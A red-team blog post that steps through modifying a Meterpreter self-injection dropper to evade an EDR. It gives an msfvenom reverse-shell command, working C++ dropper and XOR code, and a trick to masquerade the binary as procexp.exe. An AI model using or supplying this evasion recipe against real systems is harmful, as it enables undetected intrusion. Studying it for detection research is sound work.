@@ -1,0 +1,617 @@
+# https://redops.at/en/blog/meterpreter-vs-modern-edrs-in-2023
+
+<!DOCTYPE html><html lang="en">
+    <body id="Main">
+        
+        <main>
+                    <div class="blog-page">
+        <div class="page-intro">
+            <a class="back" href="https://redops.at/en/knowledge-base">Previous</a>
+            <div class="content container">
+                <h1 class="h1">
+                    Meterpreter vs Modern EDR(s)
+                </h1>
+                <div class="blog-text-section">
+                    <p><strong>tl;dr</strong> Endpoint security continues to be a hot topic, with almost every organisation deploying various products such as antivirus (AV), endpoint protection (EPP) and endpoint detection and response (EDR) systems to prevent or monitor the execution of malware. In recent years, a real game of cat and mouse has developed between the red teamers (attackers) and the blue teamers (defenders). Malicious attackers and Red Teamer alike keep finding new ways to execute malware on the target computer unnoticed, but it usually does not take long for the defenders or product manufacturers to improve. Meanwhile, from an attacker's point of view, there are a number of different techniques that can be used under Windows OS to enhance their own malware or increase its legitimacy. Depending on the technique used, the implementation can sometimes be complex, e.g. direct syscalls, indirect syscalls, hardware breakpoints, etc.<br><br>However, in this blog post I would like to show that even today (March 2023) very simple modifications to a Meterpreter shellcode dropper can be sufficient to bypass modern EDRs. To do this, we will step through three modifications to a Meterpreter reference dropper and record the results in the context of EDR evasion. The three modifications include simply encrypting the Meterpreter shellcode with the XOR algorithm, adding legitimate metadata using a manifest file, and moving the Meterpreter shellcode from the .text section to the .data section.</p>
+                </div>
+                                                <ul class="tags">
+                                            <li>
+                            <a class="tag glitch dark" href="https://redops.at/en/knowledge-base?filter=EDR%20Evasion" data-content="EDR Evasion">
+                                EDR Evasion
+                            </a>
+                        </li>
+                                            <li>
+                            <a class="tag glitch dark" href="https://redops.at/en/knowledge-base?filter=Malware%20Development" data-content="Malware Development">
+                                Malware Development
+                            </a>
+                        </li>
+                                    </ul>
+            </div>
+            
+        </div>
+        <div class="blog-content">
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/iStock-1248685118.jpg" alt="I Stock 1248685118" width="1239" height="847">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Disclaimer</h3>
+<p>The content and all code examples in this article are for research purposes only and must not be used in an unethical context!<br><br></p>
+<h3>Introduction</h3>
+<p>When I talk about EDRs in this article, I mean a combination of endpoint protection (EPP) and endpoint detection and response (EDR). I also want to define the term "evasion" in the context of EDRs and malware. When I talk about the fact that it is or has been possible to bypass the EDR, the term "bypass" refers to the fact that no prevention and no detection has taken place on the part of the EDR. However, the EDR continues to collect telemetry data at the endpoint that can be used for active threat hunting. <br><br>In the meantime, from the point of view of the attackers (Red Team), there is a whole range of different techniques, such as direct system calls, indirect system calls, API unhooking, etc., which can help us as Red Teamers to evade detection by Endpoint Protection (EPP) and Endpoint Detection and Response (EDR) systems. However, even if you add various evasion features to your malware, e.g. shellcode dropper, the command and control framework (C2) used or the respective shellcode often seems to be a certain limitation. With modern Red Team C2s such as Nighthawk, Cobal Strike, Brute Ratel, etc., this seems to be less of a problem, as the stager's shellcode or payload is already equipped with very useful evasion features such as indirect syscalls, hardware breakpoints, etc. by default.<br><br>The situation is somewhat different with freely available frameworks such as the Metasploit Framework (MSF), which can sometimes make it very difficult to bypass modern EDRs in the context of command and control connections. Whether and at what stage Meterpreter shellcode, or the execution of <a href="https://github.com/rapid7/metasploit-framework/blob/0cbfd483ae9291583f8f3bdabe3cf168c5b78991/lib/msf/core/payload/windows/reverse_tcp.rb#:~:text=NULL%2C%20dwLength%2C%20MEM_COMMIT%2C-,PAGE_EXECUTE_READWRITE,-)%3B" target="_blank" rel="noreferrer noopener">Meterpreter shellcode</a>, is detected by EDRs depends on various factors such as signatures in the shellcode. Similarly, how the executed shellcode behaves in memory can be important for detection by EDRs. For example, Metasploit or Meterpreter shellcode in memory is detected by EDRs based on certain patterns.<br><br>For example, if you look at legitimate areas of memory with Process Hacker, you will see that they are of the type <code>Image</code> and also point to the associated image. If you look at a meterpreter payload in memory, you will notice that there are also some memory regions of type <code>private</code> that do not refer to an image. For example, the <code>4kB</code> meterpreter stager can be identified. These types of memory regions are called <code>unbacked executable sections</code> and are usually classified as malicious by EDRs.<br><br>Similarly, from an EDR's point of view, it is rather unusual for a thread to have, for example, memory areas in the .text (code) section marked as read (R), write (W) and executable (X) at the same time. By default, the .text section is a read-only section in the PE structure. When using a Meterpreter payload, this does not apply in its entirety, because by using the Windows API VirtualAlloc, certain areas are additionally marked as write (W) and executable (X), or the affected memory area is marked as <code>RWX</code> in its entirety (<code>PAGE_EXECUTE_READWRITE</code>).</p>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/msf_stager_pages.png" alt="Msf stager pages" width="1052" height="738">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>A simple self-injection dropper (reference dropper) in C++ is used as a base or reference, which is then modified step by step. After each modification of the reference dropper, it is determined whether the modification provides an advantage in bypassing the tested EDR. The following three modifications will be made to the reference dropper during the course of this article:<strong><br><br></strong></p>
+<ol><li><strong>Shellcode encryption:</strong> XOR encryption of the reference dropper's meterpreter shellcode<br><br></li><li><strong>Metadata:</strong> Add legitimate metadata to the XOR shellcode dropper using a manifest file<br><br></li><li><strong>PE structure:</strong> Move the metepreter shellcode from the .text section to the .data section in the PE structure<br></li></ol><p><br>We also want to measure the entropy value of our dropper after each change. Entropy is a measure of the randomness in a data set. In the context of computer science and cybersecurity, <a href="https://en.wikipedia.org/wiki/Entropy_(information_theory)" target="_blank" rel="noreferrer noopener">Shannon entropy</a> is most commonly used. In general, a normal file has an ordered structure, low entropy and high density. The structure of abnormal files (malware) tends to have high entropy and low density. The entropy value can be or is used by EDRs to finally classify a suspicious file as legitimate or malicious. Files with an entropy between 4.8 and 7.2 are more likely to be classified as legitimate by EDRs, while files with an entropy above 7.2 are more likely to be classified as malicious.<br><br>To learn more about entropy in the context of malware, see the following <a href="https://practicalsecurityanalytics.com/file-entropy/" target="_blank" rel="noreferrer noopener">article</a>. The free version of <a href="https://www.winitor.com/download2" target="_blank" rel="noreferrer noopener">pestudio</a> was used to measure entropy.<br><br>Out of respect for the EDR vendor, the name of the EDR is not mentioned. However, readers are invited to perform the test with their own EDR.</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Meterpreter Reference Dropper</h3>
+<p>First we need to create our C++ reference dropper. So we start by creating a staged meterpreter TCP payload with msfvenom. The -f parameter indicates that we want our payload output in typical shellcode hex format.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-bash" tabindex="0"><code class="code-block-inner language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=External_IPv4_Redirector LPORT=80 -f c</code></pre>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/meterpreter_tcp_payload.png" alt="Meterpreter tcp payload" width="729" height="245">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>The generated meterpreter shellcode in hex format can then be inserted into the C++ POC and compiled.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-cpp" tabindex="0"><code class="code-block-inner language-cpp">#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+int main() {
+
+	// Replace your MSF-Shellcode 
+	unsigned char code[] = "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\...";
+
+	// Allocate memory for MSF-Shellcode 
+	void* exec = VirtualAlloc(0, sizeof code, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+	// Copy MSF-Shellcode into the allocated memory 
+	memcpy(exec, code, sizeof code);
+
+	// Execute MSF-Shellcode in memory 
+	((void(*)())exec)();
+	return 0;
+
+}</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4>Technical Explanation Reference Dropper</h4>
+<ul><li>We define the variable <code>code</code> within the main function, which stores our meterpreter shellcode. Since the variable is defined within the main function, it is declared as a local variable, with the shellcode stored in the <code>.text</code> (code) section, or in our case in .rdata, since the meterpreter stager is larger than <code>255 bytes</code> (thanks to <strong>Paranoid Ninja</strong> and <strong>den18</strong> for helping me out in that topic!). <br><br></li></ul><ul><li>We define a pointer of type <code>void*</code> with the variable <code>exec</code>, which points to the Windows API <code>VirtualAlloc</code> and returns the start address of the allocated memory block.<br><br></li></ul><ul><li>The Windows API <code>VirtualAlloc</code> is used to allocate memory, a brief explanation of the parameters used in the function.<br><br><ul><li>The first argument, <code>0</code>, is a pointer to the start address of the memory block. In this case, we ask <code>VirtualAlloc</code> to determine the start address by passing a null pointer. <br><br></li><li>The second argument, <code>sizeof code</code>, specifies the size of the block of memory to allocate. As <code>code</code> is an array of bytes, the size of the array is calculated using the sizeof operator.<br><br></li><li>The third argument, <code>MEM_COMMIT</code>, instructs <code>VirtualAlloc</code> to allocate memory pages to the block, which means that physical memory is allocated. This ensures that the memory is available for use.<br><br></li><li>The fourth argument, <code>PAGE_EXECUTE_READWRITE</code>, defines the memory protection for the allocated block. In this case the definition is read (R), write (W) and executable (X).<br><br></li></ul></li></ul><ul><li>The <code>memcpy</code> function is called to copy the meterpreter shellcode from the <code>code</code> array into the allocated memory.<br><br><ul><li>The first argument, <code>exec</code>, is a pointer to the target memory block.<br><br></li><li>The second argument, <code>code</code>, is a pointer to the source memory block.<br><br></li><li>The third argument, <code>sizeof code</code>, specifies the number of bytes to copy.<br><br></li></ul></li><li>The shell code is executed by calling the function pointer <code>((void(*)())exec)()</code>. With this syntax, the <code>exec</code> pointer is converted to a function pointer, then the function is called, and then the meterpreter shellcode is executed.</li></ul>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4><strong>Observations&nbsp;</strong></h4>
+<p>After copying the reference Meterpreter shellcode dropper to the hard drive of the computer with EDR installed, the .exe was statically detected by the tested <strong>EDR</strong> as expected, classified as malicious with a <strong>high priority</strong> and quarantined. This result was to be expected as the standard Meterpreter shellcode has unique static signatures and as such should be detected as malicious by any modern EDR and prevented from running.<br></p>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/blog/Flow_chart_msf_reference_dropper.png" alt="Flow chart msf reference dropper" width="1460" height="602">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>As mentioned at the beginning, we always want to keep an eye on the entropy of our shellcode dropper and use the free version of PE-Monitor to do this. In this case, the <strong>entropy</strong> of the compiled reference dropper is <strong>4.901</strong>.</p>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/EDR_High_Alert_entropy.png" alt="EDR High Alert entropy" width="708" height="158">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Meterpreter Shellcode XOR-Encryption </h3>
+<p>In this section we start with the<strong> first modification</strong> of our reference dropper. To prevent static detection of the meterpreter shellcode, we can try encrypting the shellcode using the <a href="https://en.wikipedia.org/wiki/XOR_cipher" target="_blank" rel="noreferrer noopener">XOR algorithm</a>. In general, encrypting the shellcode increases the entropy of the dropper, but since we want to avoid increasing it too much, we deliberately chose not to encrypt it with a stronger algorithm like AES in this experiment.<br><br>The following C++ code can be used to encrypt the meterpreter shellcode. It is not the cleverest or most convenient, but it does the job and produces an XOR-encrypted Meterpreter TCP shellcode as output.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-cpp" tabindex="0"><code class="code-block-inner language-cpp">#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+int main()
+{
+    unsigned char code[] = "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\...";
+
+	char key = 'ABCD';
+	int i = 0;
+	for (i; i &lt; sizeof(code); i++)
+	{
+		printf("\\x%02x", code[i] ^ key);
+	}</code></pre>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/xor_encrypted_meterpreter_shellcode.png" alt="Xor encrypted meterpreter shellcode" width="616" height="164">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>To be able to use the encrypted shellcode, we extend our reference dropper with the XOR decryption part. The XOR-encrypted shellcode and the key used are then inserted into the VS project.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-cpp" tabindex="0"><code class="code-block-inner language-cpp">#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+int main() {
+
+	// Replace your XOR encrypted MSF-Shellcode 
+	unsigned char code[] = "\xa6\x12\xd9\xbe\xaa\xb2\x96\...";
+
+	// Decrypt XOR encrpyted MSF-Shellcode
+	char key = 'ABCD';
+	int i = 0;
+	for (i; i &lt; sizeof(code) - 1; i++)
+	{
+		code[i] = code[i] ^ key;
+	}
+
+	
+	// Allocate memory for the decrypted MSF-Shellcode 
+	void* exec = VirtualAlloc(0, sizeof code, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+	// Copy the MSF-Shellcode into the allocated memory 
+	memcpy(exec, code, sizeof code);
+
+	// Execute the decrypted MSF-Shellcode in memory 
+	((void(*)())exec)();
+	return 0;
+
+}</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4><strong>Observations</strong></h4>
+<p>Various observations could be made with the EDR tested. Interestingly, the XOR encryption of the Meterpreter shellcode did not always seem to be sufficient to bypass the static part of the EDR. Although the configuration of the EDR was not changed between attempts, our dropper (.exe) was partially intercepted by the static detection of the EDR and moved to quarantine.<br><br>In some attempts, encrypting the Meterpreter shellcode with the XOR algorithm appeared to be sufficient to bypass the static detection of the EDR. In these cases (best case) our dropper was able to execute, but was detected by the dynamic analysis of the EDR and an alert was raised with a <strong>medium priority</strong>. In some cases (worst case) the Meterpreter dropper was still statically detected by the EDR after execution and classified with a high priority alert. Overall, however, a first small partial success can be reported as the EDR was able to reduce the priority of the alert from <strong>High to Medium</strong>.<br></p>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/blog/Flow_chart_msf_first_modification.png" alt="Flow chart msf first modification" width="1820" height="1080">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>After our first modification of the reference dropper, we want to measure the entropy of our compiled .exe again with pestudio. As expected, the entropy increases slightly from 4.901 to <strong>5.033</strong> due to the encryption of the Meterpreter shellcode.</p>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/EDR_XOR_Medium_Alert_entropy.png" alt="EDR XOR Medium Alert entropy" width="707" height="157">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Metadata-Manifest</h3>
+<p>In the previous step, we had partial success with our EDR evasion experiment. However, in some cases our Meterpreter shellcode dropper was statically detected by the EDR and quarantined despite XOR encryption.<br><br>The <strong>second modification</strong> to the Meterpreter reference dropper is to investigate the effect of adding <strong>legitimate metadata</strong> in the form of a <strong>manifest file</strong>. Simply put, with this modification we want our shellcode dropper to gain some legitimacy from an EDR perspective. For this experiment, the code from the previous step (XOR encryption) is not changed, we simply add an empty manifest file to the Visual Studio project, which is then filled with metadata. The manifest file can be added to the Visual Studio project as a resource (version). In this case we use the metadata from Process Explorer for our manifest (sorry Mark for using the metadata from Process Explorer).</p>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/VS_manifest_ressource.png" alt="VS manifest ressource" width="814" height="386">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>We can then recompile our Meterpreter shellcode dropper and see that our .exe now has the metadata of the original procexp.exe. To make our dropper look even more legitimate, we change the name of the dropper to <strong>procexp.exe</strong>.</p>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/manifest_procexp.png" alt="Manifest procexp" width="356" height="311">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4><strong>Observations</strong><br></h4>
+<p>Again, although the configuration of the EDR was not changed between trials, different observations could be made in several trials after the second modification.<br><br>In general, we can say that the addition of legitimate metadata has a positive effect on our shellcode dropper (from the attacker's point of view), but in detail there were clear differences. We recall that after the first modification, where we encrypted the shellcode using the XOR algorithm, there were still attempts where the meterpreter shellcode was statically captured by the EDR. After adding the legitimate metadata to our dropper, we found that the metadata had a positive effect on static EDR evasion. In other words, although the dropper was statically captured by the XOR shellcode before, after adding the metadata, the dropper was no longer statically captured by the EDR. This is another small partial success, as the problem of static EDR invasion has been solved for now.<br><br>After running our dropper (procexp.exe), we also observed a different behaviour of the EDR. In some experiments (best case) the metadata also seemed to have a positive influence on the dynamic EDR invasion. That means, the two modifications, XOR encryption and the addition of a legitimate manifest file, were enough to bypass the well-known EDR with a meterpreter TCP shellcode. In further attempts (worst case) - the EDR configuration was again left unchanged - the dropper was able to execute, but was detected by the EDR with a <strong>low priority</strong>. Even though the dropper was still partially detected by the EDR after execution through dynamic detection mechanisms, we can claim another small partial success as we were able to lower the priority of the alert again, this time from <strong>medium to low</strong>.</p>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/Flow_chart_msf_second_modification.png" alt="Flow chart msf second modification" width="1820" height="1080">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>It was also observed that adding legitimate metadata in the form of a manifest file reduced the entropy from 5.033 to <strong>4.922</strong>.</p>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/EDR_XOR_Manifest_Low_Alert_entropy.png" alt="EDR XOR Manifest Low Alert entropy" width="709" height="157">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>From .text to .data</h3>
+<p>In the previous step, we achieved further partial successes. In the best case, two modifications (XOR and Manifest) to our Meterpreter reference dropper were enough to bypass the tested EDR and open a stable Command and Control (C2) channel. In the worst case, our dropper was still detected and blocked by the EDR after execution, but even in this case we were able to achieve another partial success by reducing the EDR alarm from medium to low.<br><br>The <strong>third and final modification</strong> to our dropper is to investigate the effect on EDR bypassing of not defining the meterpreter shellcode as a local variable inside the Main function as before, and thus storing it in the <code>.text</code> (code) section of the PE structure. Instead, we define the shellcode variable <code>code</code> outside the Main function and thus as a global variable, with the shellcode stored in the .data section of the PE structure. </p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-cpp" tabindex="0"><code class="code-block-inner language-cpp">#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+    // Replace your XOR encrypted MSF-Shellcode
+	unsigned char code[] = "\xa6\x12\xd9\xbe\xaa\xb2\x96\...";
+
+int main() {
+
+	// Decrypt XOR encrpyted MSF-Shellcode
+	char key = 'ABCD';
+	int i = 0;
+	for (i; i &lt; sizeof(code) - 1; i++)
+	{
+		code[i] = code[i] ^ key;
+	}
+
+	
+	// Allocate memory for the decrypted MSF-Shellcode 
+	void* exec = VirtualAlloc(0, sizeof code, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+	// Copy the MSF-Shellcode into the allocated memory 
+	memcpy(exec, code, sizeof code);
+
+	// Execute the decrypted MSF-Shellcode in memory 
+	((void(*)())exec)();
+	return 0;
+
+}</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>Once the third modification has been successfully made, i.e. the variable <code>code</code> has been defined as a global variable, CFF Explorer can be used to check whether the XORed Meterpreter shellcode is actually in the <code>.data</code><strong> </strong>section.</p>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/CFF_shellcode_in_data.png" alt="CFF shellcode in data" width="879" height="653">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4><strong>Observations&nbsp;</strong><br></h4>
+<p>After the third modification of the Meterpreter shellcode dropper, the same behaviour of the EDR could be observed in several attempts. The EDR did not detect our Meterpreter shellcode dropper statically after copying the dropper to disk, nor did it detect the dropper as malicious after execution. Even after repeated execution at different time intervals, the Meterpreter dropper (XOR, manifest and .data) was not detected by the EDR and a stable C2 channel could be established. <br><br>Whether and why moving the Meterpreter shellcode from the .text section (code section) or .rdata section to the .data section has a positive effect on the evasion capabilities of our shellcode dropper is currently not entirely clear and only the following assumptions can be made without claiming to be correct or complete.</p>
+<ul><li>The EDR solution uses memory scanning techniques that are specifically designed to detect shellcode in the .text section, but not in the .data section. For example, the EDR may use signature-based detection techniques that are effective at detecting common shellcode patterns in the .text section, but may not be as effective at detecting the same shellcode in the .data section.<br><br></li><li>The .text section is normally a read-only memory area, while the .data section is read-write. If the EDR solution does not monitor write access to the .data section, it may not detect malicious shellcode written to this memory area.<br></li></ul>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/blog/Flow_chart_msf_third_modification.png" alt="Flow chart msf third modification" width="1807" height="656">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>We also want to capture the entropy of our triple-modified shellcode dropper. Interestingly, moving the Meterpreter shellcode to the .data section caused the entropy to drop from 4.922 to <strong>4.783</strong>.</p>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/shellcode_in_data_section_entropy.png" alt="Shellcode in data section entropy" width="711" height="159">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Summary </h3>
+<p>After the <strong>reference dropper</strong> was copied unchanged to the hard drive of the computer with the EDR installed, detection was performed by the EDR based on known signatures in the Meterpreter shellcode. The dropper (.exe) was classified as <strong>high priority</strong> malicious and moved to quarantine.<br><br>The <strong>first modification</strong> was a simple XOR encryption of the Meterpreter shellcode and the POC of the reference dropper was extended to include the XOR decryption part. Although no further modifications were made to the dropper and the configuration of the EDR was not changed between experiments, we obtained different results. In some results, the XOR encryption of the well-known meterpreter shellcode was not sufficient and was still statically detected by the EDR and given a high priority. In other tests with the same EDR, the dropper was not statically detected. The dropper was able to run on the target, but was then dynamically detected by the EDR. However, a first partial success was recorded, as the EDR changed the priority of the alert from <strong>high to medium</strong>.<br><br>The <strong>second modification</strong> was to add legitimate Process Explorer metadata to the XOR dropper in the form of a manifest file. Again, the EDR configuration was not changed between experiments, but again, different results were obtained. In the worst case, the metadata added to our dropper "only" had a positive effect on bypassing the static detection of the EDR, and the dropper was still detected by the EDR after execution. At best, the metadata in the form of the manifest file also seemed to have a positive effect on bypassing the EDR's dynamic detection. In other words, the dropper's execution was no longer blocked by the EDR, and a stable Meterpreter command and control channel could be opened. However, even though the addition of the procexp.exe metadata only had a positive effect on the static EDR invasion as described above, there was another partial success in that the EDR no longer prioritised the dropper with medium, but with <strong>low</strong>.<br><br>The <strong>third and final modification</strong> to our Meterpreter shellcode dropper was to move the shellcode from the .text section to the .data section by declaring the shellcode variable <code>code</code> in the C++ POC as a global variable instead of a local one. Here we found that the third change was sufficient to "<strong>permanently</strong>" bypass the EDR, despite simple self-injection and meterpreter shellcode in our experiments.<br><br>It was also interesting to observe that adding legitimate metadata (manifest) and also moving the Meterpreter shellcode to the .data section in the PE structure had a reducing effect on the entropy of the Meterpreter dropper.</p>
+<ul><li>Reference Dropper with standard Meterpreter TCP shellcode -&gt; <strong>4.901<br></strong></li><li>Dropper after first modification (XOR) -&gt; <strong>5.033<br></strong></li><li>Dropper after second modification (XOR and manifest) -&gt; <strong>4.922<br></strong></li><li>Dropper after third modification (XOR, manifest and .data) -&gt; <strong>4.783<br><br></strong></li></ul><p>Why it is possible today (March 2023) to "permanently" bypass the well-known EDR with a simple meterpreter TCP payload cannot be clearly explained. My guess is that the combination of the three modifications helps the dropper to gain legitimacy and thus no longer be perceived as harmful by the EDR as a whole. In my opinion, the entropy of the dropper also plays a crucial role. In the case of the EDRs tested, I had the impression that if the entropy of the malware is between 4.5 and 4.8, the probability of it not being detected as harmful by the EDR is significantly higher.<br><br>But what can we learn from this test? Although I was a little surprised myself in the case of the EDR tested, I am not interested in pointing the finger at a product. Much more important to me is the realisation that, from an attacker's point of view, bypassing an EDR does not always require complex evasion techniques. A few simple modifications to a self-injection dropper are enough to bypass even good EDRs. The experiment also showed me that the <strong>shellcode</strong> of a C2 framework is <strong>not necessarily</strong> a <strong>limitation</strong>. In the case of Meterpreter, there are probably many signatures used to detect EDRs, but with a few simple modifications it is still possible to create a usable Meterpreter dropper.</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-red">
+    <div class="content blog-container">
+        <div class="text">
+            <p>Happy Hacking!</p>
+<p>Daniel Feichter <a href="https://twitter.com/VirtualAllocEx" target="_blank" rel="noreferrer noopener">@VirtualAllocEx</a></p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-grey">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>References&nbsp;</h3>
